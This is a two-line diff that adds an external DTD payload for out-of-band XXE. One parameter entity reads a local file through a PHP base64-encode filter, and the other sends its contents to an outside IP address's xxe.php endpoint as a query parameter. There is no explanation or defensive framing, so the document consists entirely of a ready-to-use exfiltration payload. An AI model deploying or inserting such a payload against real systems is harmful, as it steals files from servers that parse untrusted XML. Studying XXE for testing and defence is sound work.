@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
+<!ENTITY % int "<!ENTITY % send SYSTEM 'http://47.93.116.52/xxe.php?p=%file;'>">
